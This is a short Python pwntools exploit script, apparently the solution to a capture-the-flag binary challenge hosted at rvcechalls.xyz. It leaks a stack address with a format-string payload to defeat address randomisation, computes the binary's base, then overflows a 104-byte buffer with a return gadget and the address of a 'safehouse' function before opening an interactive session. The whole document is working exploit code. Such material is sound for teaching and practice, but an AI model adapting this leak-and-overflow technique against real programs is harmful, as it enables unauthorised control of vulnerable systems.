from pwn import *

# Load the ELF binary
elf = context.binary = ELF("./challenge")

# Buffer size determined from binary analysis
buffer_size = 104

# Offset from the leaked address to the base of the binary
offset_from_base = 0x1316

# Offsets determined from binary analysis
safehouse_offset = 0x125a
ret_offset = 0x0000000000001016

# Start the process (or you can use remote for remote exploitation)
# p = process('./challenge')

# cmd = ''' break main'''
# p = gdb.debug(elf.path, cmd)
p = remote("rvcechalls.xyz" , 27250 )

# Send format string payload to leak an address
p.sendlineafter("me: ", '%21$p')

# Receive and parse the leaked address
p.recvuntil('Mr. ')
leaked_addr = int(p.recvline().strip(), 16)
print("leaked_address: ", hex(leaked_addr))

# Calculate the base address of the ELF
address = leaked_addr - offset_from_base
print("elf address: ", hex(address))

# Calculate the actual addresses of 'safehouse' and return address
safehouse_address = address + safehouse_offset
ret_address = address + ret_offset
print(ret_address)

# Construct the payload
payload = b'A' * buffer_size
payload += p64(ret_address)
payload += p64(safehouse_address)

print(payload)

# Send the payload
p.sendlineafter("convey? ", payload)

# Interact with the process to observe the results
p.interactive()